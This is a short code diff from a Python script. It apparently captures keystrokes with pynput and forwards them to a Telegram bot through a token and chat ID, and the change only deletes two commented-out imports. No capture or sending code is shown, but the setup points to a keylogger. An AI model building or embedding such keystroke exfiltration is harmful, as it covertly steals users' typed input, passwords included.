@@ -1,12 +1,10 @@
 import asyncio
-# import keyboard
 import socket
 import time
 import uuid
 from datetime import datetime
 from pynput import keyboard
 
-# from replace import char_replacements
 from tg_output_bot import bot, TOKEN, CHAT_ID
 
 buffer_for_tg = ""
